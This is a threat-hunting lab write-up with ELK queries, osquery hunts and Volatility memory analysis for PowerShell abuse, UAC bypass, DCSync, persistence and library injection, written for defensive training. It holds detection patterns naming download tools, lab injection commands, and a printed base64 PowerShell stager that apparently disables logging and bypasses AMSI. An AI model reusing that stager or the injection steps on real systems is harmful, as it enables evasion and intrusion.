+valid if it spawns a process "powershell.exe" (let's omit the fact that a renamed PowerShell
+could be spawned for now):
+winlog.event_data.ParentImage:(*mshta.exe OR *rundll32.exe OR *regsvr32.exe OR
+*services.exe OR *winword.exe OR *wmiprvse.exe OR *powerpnt.exe OR *excel.exe OR
+*msaccess.exe OR *mpub.exe OR *visio.exe OR *outlook.exe OR *chrome.exe OR *iexplorer.exe
+OR *sqlserver.exe) AND winlog.event_data.Image : *powershell.exe
+Once executed, we receive the following matches:
+If you expand the ﬁrst match and look at the parent process's command line argument, you'll
+notice the following which indeed looks suspicious:
+
+Regsvr32 using a well-known command execution to spawn PowerShell.
+Task 3. Perform a hunt for renamed PowerShell.exe
+Our detection is based on the fact that the PowerShell executable preserves "PowerShell" in its
+description, regardless of the name. So, we look into Sysmon again for any created process
+(event id 1) with description containing "PowerShell" that is not powershell.exe or
+powershell_ise.exe. We construct the following query:
+winlog.event_data.Description:*PowerShell AND NOT
+(winlog.event_data.Image:*powershell.exe OR winlog.event_data.Image:*powershell_ise.exe)
+Once executed, we get the following match:
+The image above reveals that the program executed is "C:\ProgramData\Windows.exe"
+
+Another approach would be to look for EventID 400, where the HostName is ConsoleHost but
+the HostApplication is not powershell.exe.
+
+Task 4. Perform a hunt for base64-encoded PowerShell commands
+
+For this part, we'll use Sysmon event id 1, looking for command line arguments that would
+match those of an encoded command. The parameter that we are looking for is "-
+encodedcommand" but the bare minimum that PowerShell needs provided as arguments to
+threat it as an encoded command is simply "-e". So, let's ﬁlter out for event id 1, look for all
+powershell processes (powershell.exe or PowerShell in description), and parameter that
+contains "-e" - ﬁnal query is shown below:
+
+(winlog.event_data.Description:*PowerShell OR winlog.event_data.Image:*powershell.exe)
+AND winlog.event_data.CommandLine:*-e*
+
+Once executed, we receive the following output:
+If we decode the passed command, we'll ﬁnd that it is the command "whoami".
+Task 5. Perform a hunt for PowerShell attacks utilizing GZIP compression
+For this task, we'll be looking at ScriptBlockText of event id 4104. After some research we ﬁnd
+that GZIP archives have the magic number "H4sI", which appears quite unique. That will be our
+detection -- let's ﬁlter for event id 4104 and ﬁnal query below:
+winlog.event_data.ScriptBlockText:*H4sI*
+Once executed, we receive the following output:
+
+Task 6. Perform a hunt for obfuscated PowerShell code using XOR
+For this task, we'll be looking at ScriptBlockText of event id 4104. After an extensive research, we
+ﬁnd that XOR usage involves the operators "char", "bxor" and "join". After ﬁltering for event id
+4104, we construct a query searching only for the operators "bxor" and "join" as a more broad
+perspective to the search:
+winlog.event_data.ScriptBlockText:(*bxor* AND *join*)
+Once executed, we receive the following output:
+
+Task 7. Perform a hunt for execution of an assembly from ﬁle by PowerShell
+For this task, we'll be looking at ScriptBlockText of event id 4104. After performing a research,
+we ﬁnd that to execute an assembly from ﬁle, a function "Load" together with either
+"ReadAllBytes" or "LoadFile" is utilized. After ﬁltering for event id 4104, we construct the ﬁnal
+query as:
+winlog.event_data.ScriptBlockText:((*Load*) AND (*ReadAllBytes* OR *LoadFile*))
+Once executed, we receive the following output:
+Task 8. Perform a hunt for PowerShell commands downloading content
+For this task, we'll be looking at ScriptBlockText of event id 4104. After doing our research, we
+identify a large number of possibilities for download content. The ﬁnal query with all of them
+included is shown below:
+winlog.event_data.ScriptBlockText:(*WebClient* OR *DownloadData* OR *DownloadFile* OR
+*DownloadString* OR *OpenRead* OR *WebRequest* OR *curl* OR *wget* OR *RestMethod*
+OR *WinHTTP* OR *InternetExplorer.Application* OR *Excel.Application* OR
+*Word.Application* OR *Msxml2.XMLHTTP* OR *MsXML2.ServerXML* OR
+*System.XML.XMLDocument* OR *BitsTransfer*)
+Once executed, we receive the following output, which identiﬁes 3 distinctive log entries:
+
+The search detected download through the commands:
+     Start-BitsTransfer
+     Curl
+     Invoke-RestMethod
+At this point, you should also be aware that COM objects can be used to perform ﬁle download,
+therefore, the following query should also be incorporate in the search. In our research, we
+identiﬁed the following CLSIDs to be interesting:
+"0002DF01-0000-0000-C000-000000000046" | InternetExplorer.Application
+"F6D90F16-9C73-11D3-B32E-00C04F990BB4" | Msxml2.XMLHTTP
+
+"F5078F35-C551-11D3-89B9-0000F81FE221" | Msxml2.XMLHTTP.3.0
+"88D9D96A-F192-11D4-A65F-0040963251E5" | Msxml2.XMLHTTP.6.0
+
+"AFBA6B42-5692-48EA-8141-DC517DCF0EF1" | Msxml2.ServerXmlHttp
+"AFB40FFD-B609-40A3-9828-F88BBE11E4E3" | Msxml2.ServerXmlHttp.3.0
+"88D96A0B-F192-11D4-A65F-0040963251E5" | Msxml2.ServerXmlHttp.6.0
+"2087C2F4-2CEF-4953-A8AB-66779B670495" | WinHttp.WinHttpRequest.5.1
+"000209FF-0000-0000-C000-000000000046" | Word.Application
+
+"00023500-0000-0000-C000-000000000046" | Excel.Application
+Task 9. Perform a hunt for obfuscated PowerShell commands
+For this task, we'll be looking at ScriptBlockText of event id 4104. After doing a research on
+obfuscated commands, we identify a large number of interesting characters that may be of
+interest, which compose the ﬁnal query as:
+
+winlog.event_data.ScriptBlockText:((*char* AND *join*) OR ((*ToInt* OR *ToInt16* OR
+*ToDecimal* OR *ToByte* OR *ToUnit* OR *ToSingle*) AND (*ToChar* OR *ToString* OR
+*String*)) OR (*ForEach* AND *Xor*))
+Once executed, we receive the following output:
+Indeed, some ofcuscated commands were detected. 4 of the 5 identiﬁed logs appear to be
+associated with the same command, while he 5th one is a false positive from a previous
+exercise. Therefore, we have identiﬁed only 1 command so far, we should investigate for more
+obfuscation techniques to ﬁnd others.
+
+Additional research leads us to reverse obfuscated, or certain words spelled backwards. We go
+through common cmdlets, and terms and construct a query with them in reverse order as
+follows:
+
+To detect the second obfuscated command, we utilize the following query, which identiﬁes
+PowerShell commands spelled backwards:
+
+winlog.event_data.ScriptBlockText:(*hctac* OR *kearb* OR *dnammoc* OR *ekovn* OR *elifd*
+OR *rahc* OR *etirw* OR *eddih* OR *tpircs* OR *ssecorp* OR *llehsrewop* OR *esnopser*
+OR *daolnwod* OR *tneilcbew* OR *tneilc* OR *ptth* OR *elifotevas* OR *46esab* OR
+*tcejbo* OR *maerts* OR *hcaerof* OR *retupmoc*)
+
+Once executed, we receive the following output:
+ELK LAB 2
+
+ask 1. Hunt for malicious use of rundll32
+After visiting the provided link in the task's description, we ﬁnd out that rundll32.exe can call
+pcwutl.dll which has the ability to execute an application. Utilizing that information, we can
+construct the following query (against the available Sysmon logs):
+process.name:rundll32.exe AND (process.args:pcwutl.dll AND
+process.args:LaunchApplication)
+Once the query is executed, we get the following match:
+
+Task 2. Hunt for UAC Bypass
+Following the provided hint, we focus on technique 7. According to the documentation, the
+bypass is implemented through an abuse of "cliconfg.exe". Because the abuse requires that
+cliconfg.exe loads "NTWDBLIB.dll", we'll focus our detection exactly on that, speciﬁcally ﬁltering
+for Sysmon's Event ID 7 -- Image loaded. Therefore, we construct the following query:
+event.id:7 AND (process.name:cliconfg.exe AND ﬁle.path:NTWDBLIB.dll)
+Once executed, we get the following match:
+
+Task 3. Hunt for RDP Settings tampering
+Taking into account the hint provided, if any RDP tampering or abuse (eg. RDP tunneling etc) is
+to occur, RDP should ﬁrst be enabled. Therefore, our detection will focus on detecting whether
+RDP has been enabled. One of the common ways to do this, is to monitor if netsh is used to
+create a ﬁrewall rule that allows an RDP connection. Therefore, we focus our detection on
+Sysmon event ID 1 - Process Creation. Finally, we construct the following detection rule:
+event.id:1 AND (process.name:netsh.exe AND (process.args:localport=3389 AND
+process.args:action=allow))
+Once executed, we get the following match:
+
+Clearly, enabling RDP on its own is not necessarily malicious, therefore, additional e ort is
+required to conclude that. Nonetheless, tampering has occurred.
+Task 4. Hunt for DCSync
+One way to obtain a detection rule is by looking at Sigma, speciﬁcally the DCSync detection
+rule here. We therefore construct the following query:
+event.id:4662 AND NOT (user.name:*$ OR user.name:AUTHORITY OR user.name:Window) AND
+(object.properties:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 OR object.properties:Replicating)
+Once executed, we get the following match:
+
+Task 5. Hunt for Remote WMI Usage
+If we pay attention to the provided links and hint, we'll identify that remote usage of WMI will
+create an Event ID 4648 -- logon with explicit credentials, with source process of wmic.exe. That
+is illustrated on the image below:
+
+Utilizing that, we can create our detection technique and construct the following query:
+event.id:4648 AND process.executable:WMIC.exe
+Once executed, we get the following match:
+If we expand that entry, we'll get more details on the account(s) associated with the login:
+
+Task 6. Hunt for LOLBAS openurl
+Let's take into account everything the hint of this task mentioned as well as Sysmon Event ID 1 -
+Process Creation, to construct a detection query as follows:
+process.executable:rundll32.exe AND process.args:(url.dll OR ieframe.dll OR shdocvw.dll)
+Once executed, we get 5 matches. A single match with ieframe.dll, which opens a URL ﬁle from
+a temporary directory:
+
+The other 4 matches are related to url.dll. As we can see below, one of them executes an .hta
+ﬁle:
+
+The fact that .hta ﬁle is being executed means that mshta, as the default handler, will be called.
+Therefore, if we utilize the following query, we can conﬁrm that calc.hta gets executed by mshta:
+process.executable:mshta.exe AND process.args:calc.hta
+Once executed, we receive the following match:
+
+Task 7. Hunt for persistence through scheduled Tasks
+By researching the provided URL, we identify that both "at.exe" and "schtasks.exe" can be used
+to schedule a task on a Windows host. While "at.exe" is rarely used, we are interested in any
+occurrence of its execution but for "schtasks.exe", we'll only look into those that are creating
+new tasks. The detection is based on Sysmon Event ID 1 - Process Creation. Finally, we
+construct the following query:
+event.id:1 AND ((process.executable:schtasks.exe AND process.args:create) OR
+process.executable:at.exe)
+Once the query is executed, we'll get the following match:
+
+On the output above, we can see that an action that executes "mshta.exe" against a remote URL
+address is added. To verify that the command executed successfully, we can perform another
+search for Sysmon Event ID 11 - File Create and search whether a task with the ﬁlename
+provided is now available under C:\Windows\Tasks where all tasks are stored:
+event.id:11 AND ﬁle.path:MSOFFICE_
+
+Task 8. Hunt for UAC Bypass #2
+After reviewing the linked blog post and studying the method described, we identify that a
+detection technique would be to monitor the registry key at:
+"HKCU:\Software\Classes\exeﬁle\shell\runas\command\isolatedCommand"
+However, in our experience, the location of the key may change slightly, therefore, the exact
+location we'll be looking for is any registry key that contains
+"shell\runas\command\isolatedCommand". To monitor registry key events, we will utilize
+Sysmon Event ID 13 -- Registry event. Finally, we construct the following query:
+event.id:13 AND registry_key_path:"shell\\runas\\command\\isolatedCommand"
+Once the query is executed, we get the following match:
+
+If we expand the entry, we'll see the value which is added to the key:
+Upon successful elevation, notepad.exe will start in high integrity.
+ELK LAB 3
+
+Select winlogbeat-* and select start date from November-1-2017 to till date.
+
+Task 1. Perform a hunt for account discovery
+In this task, we begin by reading the documentation in the hint's area. After going through it,
+we'll discover that "net" is a utility often used for this enumeration. Moreover, Windows 10 has
+introduced two new events, which are quite interesting:
+
+     4798 -- A user's local group membership was enumerated
+     4799 -- A security-enabled local group membership was enumerated
+Taking the above into account, we create the following query:
+winlog.event_id:(4798 OR 4799) AND winlog.event_data.CallerProcessName:(net OR net1) AND
+winlog.computer_name: MSEDGEWIN10
+Once we execute the query, we get the following output (for brevity, only display user who did
+the action and the user/group name that was being enumerated):
+The user IEUser has been enumerating the built-in group Administrators, and the built-in
+account Administrator.
+
+Task 2. Hunt for Persistence through Accessibility Features
+
+Reviewing the information available in T1015, we assemble the following list of targeted
+executables:
+
+     Sethc.exe
+
+     Utilman.exe
+
+     Osk.exe
+
+     Magnify.exe
+
+     Narrator.exe
+
+     DisplaySwitch.exe
+
+     AtBroker.exe
+
+Now, taking into account that the hint refers to ﬁle replacement with cmd.exe, what we would
+be interested into, is if a ﬁle with any of the names listed above contains the Description ﬁeld
+that matches cmd.exe -- essentially, we are looking for renamed cmd.exe. Finally, the user it
+would execute as is "NT AUTHORITY/SYSTEM". The query we construct is as follows:
+
+winlog.event_data.Image:("C:\Windows\System32\osk.exe" OR
+"C:\Windows\System32\sethc.exe" OR "C:\Windows\System32\utilman.exe" OR
+"C:\Windows\System32\magnify.exe" OR "C:\Windows\System32\narrator.exe" OR
+"C:\Windows\System32\displayswitch.exe" OR "C:\Windows\System32\atbroker.exe") AND
+winlog.event_data.Description:"Windows Command Processor" AND
+winlog.event_data.User:"NT AUTHORITY\SYSTEM" AND
+winlog.computer_name:DC1.insecurebank.local
+
+Once the query is executed, we get the following match:
+Task 3. Hunt for Privilege Escalation through Scheduled tasks
+Reading through the hinted document, we create a list of writable locations by all users, which
+is suspicious to run tasks from (remember to ﬁlter out known-good!). These locations are:
+
+     C:\users\*
+     C:\programdata\*
+     C:\Windows\Temp\*
+Now for this hunt, we have only Sysmon logs available, therefore for our detection capability will
+focus on Event ID 1 (Process creation) speciﬁcally looking for execution of schtasks.exe with a
+command line parameter that points to one of the locations listed above.
+Armed with this knowledge, we create the following query:
+winlog.event_id:1 AND winlog.event_data.Image:"C:\Windows\system32\schtasks.exe" AND
+winlog.event_data.CommandLine:("C:\users" OR "C:\programdata" OR "C:\Windows\Temp")
+Running the query, we get the following match:
+
+Based on the parameters passed to schtasks.exe, a new task is created. Following that activity,
+we can leverage Sysmon Event ID 11 (File create) to identify the creation, by querying for:
+winlog.event_data.TargetFilename:"C:\Windows\System32\Tasks\elevator"
+Running the query, we get the following match as we would expect:
+
+Now that the task was created, we can identify if it was executed by modifying our ﬁrst query but
+this time, we are looking at the command line argument that contains the task name "elevator"
+and the string "run" (which indicates task execution). We create the following query:
+winlog.event_id:1 AND winlog.event_data.Image:"C:\Windows\system32\schtasks.exe" AND
+winlog.event_data.CommandLine:("run" AND "elevator")
+Running the query, we get the following match:
+Indeed the task was executed. If we follow the documentation provided on the blog post hinted
+by the task, we would be interested to see if the task has spawned any of the following as the
+SYSTEM user:
+
+     wscript.exe
+     rundll32.exe
+     cscript.exe
+     regsvr32.exe
+     cmd.exe
+     wmic.exe
+     mshta.exe
+     powershell.exe
+Taking into consideration that the environment is based on Windows 7 workstations and as
+stated by T1053, "taskeng.exe" will be the executing process starting one of those listed above.
+Taking this into consideration, we construct the following query:
+winlog.event_id:1 AND winlog.event_data.ParentImage:"taskeng.exe" AND
+winlog.event_data.Image:("cmd.exe" OR "wscript.exe" OR "rundll32.exe" OR "cscript.exe" OR
+"regsrv32.exe" OR "wmic.exe" OR "mshta.exe" OR "powershell.exe")
+When executed, we get the following output:
+
+Command prompt was started several milliseconds after the scheduled task was executed. If
+we expand the ﬁelds, we will also note that it was executed as "NT AUTHORITY\SYSTEM".
+Finally, we can search for traces of task deletion in a similar fashion as we searched whether it
+was executed, however, now we will look for "delete" instead of "run". Our query is:
+winlog.event_id:1 AND winlog.event_data.Image:"C:\Windows\system32\schtasks.exe" AND
+winlog.event_data.CommandLine:("delete" AND "elevator")
+When we execute the query, we get the following output:
+Task 4. Hunt for RDP over a Reverse SSH Tunnel
+By reviewing the hinted post, to discover this activity, we should be looking at Event ID 4624
+(Successful logon) with Logon type 10 (indicating RDP). Moreover, we should ensure that the
+network source address points to the loop IP address (127.0.0.1). Converting this into ELK
+query, and taking into account the computer name given in the task, we get the following:
+winlog.event_id:4624 AND winlog.event_data.LogonType:10 AND
+winlog.event_data.IpAddress:"127.0.0.1" AND winlog.computer_name:"PC01.example.corp"
+When executed, we get the following output:
+
+Here we see that we have a match and have therefore successfully identiﬁed the activity our
+hunt is focused on.
+Hunting osquery
+
+Task 1. Emulate and hunt for library injection using Osquery
+First, let's access the container and start our sample-target process.
+docker exec -it target-machine bash
+cd /root/Tools/linux-inject
+./sample-target
+
+Leave this session running and open a new container session and perform the injection as
+follows.
+docker exec -it target-machine bash
+cd /root/Tools/linux-inject
+./inject -n sample-target sample-library.so
+
+The injection performed successfully.
+This is what you will see inside the SSH session where sample-target is running.
+Let's continue with the detection part, as follows.
+osqueryi
+select * from system_controls WHERE name == 'kernel.yama.ptrace_scope';
+
+Still inside the osquery "shell", execute the below.
+SELECT process_memory_map.*, pid as mpid from process_memory_map LEFT JOIN processes
+USING (pid) WHERE process_memory_map.path LIKE '/%' and process_memory_map.pseudo
+!= 1 AND process_memory_map.path NOT LIKE '/lib/%' AND process_memory_map.path NOT
+LIKE '/usr/lib%' AND process_memory_map.path != processes.path AND
+process_memory_map.permissions LIKE '%x%';
+
+The above query looks at the process memory using Osquery'sprocess_memory_maptable. We
+are interested in memory locations that have the execute permission. The original image as well
+as locations marked as pseudo should be disregarded. We should also remove known paths
+where libraries are loaded. Now, delete the injected library (you can exit osqueryi by
+executing.exit).
+CTRL + C
+ls
+rm sample-library.so
+
+Executeosqueryiagain and issue the query below.
+osqueryi
+SELECT process_memory_map.pid, process_memory_map.start, process_memory_map.end,
+process_memory_map.permissions, process_memory_map.o set,
+process_memory_map.path from process_memory_map LEFT join ﬁle USING (path) where
+pseudo != 1 AND process_memory_map.path NOT LIKE '/lib/%' AND
+process_memory_map.path NOT LIKE '/usr/lib%' AND process_memory_map.permissions LIKE
+'%x%' AND ﬁlename IS NULL and process_memory_map.inode !=0 AND
+process_memory_map.permissions = 'r-xp';
+
+The injected library is still visible! Terminate osqueryi. Let's try the other injection tool.
+Terminatesample-targetand start it again inside the other SSH session.
+cd /root/Tools/ReﬂectiveSOInjection/inject/src
+ps aux (to identify the PID of sample-target)
+./inject -p PID_of_sample_target ../../so/src/ReﬂectiveLoader.so
+
+Let's detect the library injection, again using osquery.
+osqueryi
+SELECT processes.name, process_memory_map.*, pid as mpid from process_memory_map
+join processes USING (pid) WHERE process_memory_map.permissions = 'rwxp' AND
+process_memory_map.path = '';
+
+The advantage of the second library injection technique is that the injected shared object
+doesn't have to be on disk. That's why the query above searches for memory regions marked as
+rwxp having an empty path.
+Task 2. Hunt for library injection using at scale using Kolide Fleet
+First, log into Kolide Fleet and create a new query, as follows.
+
+Inside SQL, enter the below query (the one we used before to detect the ﬁrst library injection
+tool).
+select * from system_controls WHERE name == 'kernel.yama.ptrace_scope';
+Then, select all Ubuntu hosts, by pressing the + sign next to them and ﬁnally click SAVE (as new)
+
+This is what you should see if you press the database icon on your left.
+Now click the folder icon and then click "create new pack".
+Once again add all Ubuntu hosts and click Save.
+
+This is what you should see when clicking the folder icon.
+Click on the pack you created and then click "Edit Pack" on your right.
+
+Choose the ptrace-related query you created from the menu on your right and conﬁgure as
+follows.
+Finally, click Save at the bottom.
+
+Fleet logs are being pushed to an ELK instance athttp://10.0.5.10:5601There you should be
+able to identify changes to the ptrace scope, at scale. For example, change back the ptrace
+scope on theosquery_clientmachine as follows and you should see a new event inside Kibana.
+echo 1 | tee /proc/sys/kernel/yama/ptrace_scope
+Go to Discover
+Create an index
+In conﬁgure settings select @timestamp and Click on create index pattern
+Again go to Discover, you should see the new events inside Kibana.
+
+Resources
+    1. https://www.trustedsec.com/blog/linux-hows-my-memory/
+    2. https://cybersecurity.att.com/blogs/labs-research/hunting-for-linux-library-injection-
+         with-osquery
+Hunting for WMI Abuse, Parent Process Spooﬁng &
+Access Token Theft
+
+Task 1. Have malicious WMI commands been executed on the machine?
+After reading technical reports (a.k.a tactical threat intelligence) on WMImplant, we can identify
+the below artifacts/traces.
+
+     wmiprsve.exe spawning powershell.exe and probably executing obfuscated commands
+     Environment Variable name on EIDs 12 and 13; Pattern: \\Environment\\[a-zA-Z0-9]{5}
+     by PowerShell.exe
+Now for our hunt, we can take an approach where we either group the indicators above, or we
+do a search based only on one of them. Since we are dealing with a single source of logs, we can
+take the second approach (this can be tedious though when dealing with big environments and
+multi terabytes of logs). Let's begin by the ﬁrst indicator and check if any processes have been
+spawned by "wmiprsve.exe". To parse for that, run the following command (inside a PowerShell
+as an administrator terminal):
+Get-WinEvent -FilterHashtable @{logname="Microsoft-Windows-Sysmon/Operational"; id=1} |
+Where-Object {$_.Properties[20].Value -like "*wmi*"} | ﬂ
+The output of the command contains only 1 result, which looks as follows:
+
+In fact, it appears that WmiPrvSE.exe has been executed on the machine, which spawns
+PowerShell with a command line parameter that aims to enable PowerShell Remoting.
+We can "chain" that with Windows Security Logs, where we can see a login of the
+"Administrator" account from a remote machine with IP "13.229.91.59":
+
+After which, the PowerShell Process is spawned:
+
+Note - If you look for other artifacts that we listed earlier, you may not ﬁnd any of them because
+the red team did not utilize all of WMImplant's capabilities - perhaps all that was required was a
+single action enabling PSRemoting. We would have missed this if we had searched only for
+occurrence of, for example, 2 out of the 3 detection rules. Have this in mind during your
+hunts. Don't always search for multiple indicators at once!
+Task 2. Has Parent Process Spooﬁng occurred on the machine?
+By consulting with Sysmon's Process Creation logs or with the Security Process Creation logs,
+we can identify the following.
+
+explorer.exe seems to be starting mspaint.exe. This looks quite natural, but an interesting event
+occurs immediately right after, where PowerShell creates a remote thread to mspaint.exe
+(which, to some extent, indicates that there is some kind of interaction between the 2
+processes):
+
+KEY TAKEWAYS
+    1. Robust detection rules and non-default audit policies are required to perform high
+         quality hunts
+    2. Adversaries often choose to hide in plain sight
+    3. Defender tools can be abused or disabled by attackers
+MEMORY VOLATILITY 1
+
+Task 1. Are there any hidden processes?
+To begin with, we can execute Volatility's imageinfo plugin, to get an idea of the proﬁle of the
+machine. Let's do so by navigating to /root/ and executing the command below.
+vol.py -f /root/Memory.vmem imageinfo
+In the output, Volatility displays the following:
+
+Unfortunately, Volatility did not recognize the proﬁle immediately, after some trial and error
+approach, it appears that the correct one is "Win10x64_10586", which is one of the possible
+proﬁles that Volatility suggested.
+Armed with the proﬁle, we proceed further to look at the output of psxview, directly jumping into
+looking for anomalies related to process hiding. The output of it would look similar as on the
+image below, where we have cropped the image for brevity:
+vol.py -f /root/Memory.vmem --proﬁle=Win10x64_10586 psxview
+
+Although it appears that there are processes which seem not detected by 6 out of 7 of the
+techniques that psxview uses, they are just false positives. It is likely that the EPROCESS
+memory structure has persisted from a previous reboot, however they are lacking many of the
+attributes, that's why Volatility fails to parse them properly.
+No running processes are hidden.
+Task 2. Hunt for suspicious network connections
+To look at network connections, we'll use Volatility's netscan plugin. After running it, we'll notice
+that multiple PowerShell instances have been making (they are now closed but still preserved in
+memory!) connections to port 80. Remember, we are generally interested in any process that
+makes connections to port 80 and 443, which is not a browser. Here is the output from the
+plugin, speciﬁcally ﬁltering out the connections from PowerShell:
+vol.py -f /root/Memory.vmem --proﬁle=Win10x64_10586 netscan | grep -E 'Pid|powershell.exe'
+
+Suspicious connections have originated from powershell.exe instances, all of which have
+connected to the same remote IP address on port 80.
+Task 3. Hunt for process injection
+When hunting for injection on a memory dump, Volatility's malﬁnd plugin is the go to approach.
+Running the plugin returns that injection was detected in the following processes:
+vol.py -f /root/Memory.vmem --proﬁle=Win10x64_10586 malﬁnd
+     MsMpEng.exe (PID 2012) -- 2 injected memory regions
+
+     Powershell.exe (PID 3720) -- 5 injected memory regions
+
+     SearchUI.exe (PID 4784) -- 1 injected memory region
+
+     Powershell.exe (PID 4740) -- 4 injected memory regions
+
+     Powershell.exe (PID 3004) - 5 injected memory regions
+
+It is normal for some processes to show signs of injection due to the way they operate, where in
+this case MsMpEng.exe and SearchUI.exe are false positives. PowerShell on the other hand
+should not have any signs of injection under normal operations. None of the injected memory
+regions begin with the "MZ" header though, which may indicate an injection of Windows
+executable ﬁle. Nonetheless, there may be multiple reasons for that, ranging from a tool that
+overwrites the injected memory regions as an anti-forensic technique after execution to prevent
+analysts from obtaining the injected code, to simply injection of raw shellcode instead of a
+whole executable.
+
+Task 4. What can we conclude?
+PowerShell processes have had suspicious internet connections and exhibit signs of injections.
+PowerShell's scripts are often still stored in the memory of a machine and using the "strings"
+utility, we can attempt to ﬁnd certain patterns. For example, simply checking for "Invoke-"
+results in a wealth of information:
+strings /root/Memory.vmem | grep "Invoke-"
+
+From the very ﬁrst lines, we can conclude that a compromise has occurred due to the presence
+of the string "Invoke-Mimikatz".
+Another search would be to simply look for "powershell", the output of which presents us again
+with a wealth of information, such as the following:
+strings /root/Memory.vmem | grep "powershell" > output
+vim output
+SQBmACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAcwBpA
+G8AbgAuAE0AYQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAu
+AEEAUwBzAEUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC
+4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQB
+sAHMAJwApAC4AIgBHAGUAdABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAb
+wB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFA
+AdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABH
+AFAAQwA9ACQARwBQAEYALgBHAGUAVABWAGEAbABVAEUAKAAkAE4AVQBMAGwAKQA7AEk
+ARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwB
+nAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AY
+wBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAC
+cAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwB
+jAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AY
+QBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG
+8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBsAD0AWwBDAE8AbABsAGUAQwB0AGkATwB
+OAHMALgBHAEUATgBFAFIAaQBDAC4ARABpAGMAVABpAE8ATgBBAHIAWQBbAHMAdABSAEkA
+bgBHACwAUwBZAHMAdABFAE0ALgBPAGIASgBlAGMAVABdAF0AOgA6AG4ARQB3ACgAKQA7A
+CQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJw
+BsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAGQAZAAoACc
+ARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvA
+G4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwAT
+wBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAG
+MAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8Adw
+BlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcA
+aQBuAGcAJwBdAD0AJAB2AEEAbAB9AEUATABzAGUAewBbAFMAQwBSAEkAcAB0AEIATABvAEM
+ASwBdAC4AIgBHAGUAdABGAGkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzA
+CcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUw
+BlAHQAVgBBAGwAdQBFACgAJABuAHUAbABsACwAKABOAGUAdwAtAE8AYgBqAEUAQwB0ACA
+AQwBPAGwAbABlAEMAVABpAG8ATgBzAC4ARwBlAE4ARQBSAEkAQwAuAEgAQQBTAGgAUwBF
+AHQAWwBzAFQAUgBJAG4AZwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUAbQBCAEwAe
+QAuAEcAZQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlA
+G4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfA
+A/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBpAEUATABkACgAJwBhAG0AcwBpAEkAbgBp
+AHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYw
+AnACkALgBTAEUAdABWAGEAbABVAEUAKAAkAG4AdQBMAEwALAAkAFQAcgB1AGUAKQB9ADs
+AfQA7AFsAUwB5AHMAVABFAE0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABPAEkATgBUA
+E0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABJAE4AVQ
+BFAD0AMAA7ACQAVwBjAD0ATgBlAHcALQBPAEIAagBFAEMAVAAgAFMAWQBzAFQAZQBNAC4A
+TgBlAHQALgBXAEUAYgBDAEwASQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvAD
+UALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7
+ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBl
+ACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAEQARAAoACcA
+VQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAFgAeQA9AFs
+AUwB5AFMAdABFAE0ALgBOAEUAdAAuAFcAZQBCAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlA
+EYAYQBVAEwAVABXAEUAQgBQAHIAbwB4AFkAOwAkAFcAYwAuAFAAUgBPAFgAeQAuAEMAUgB
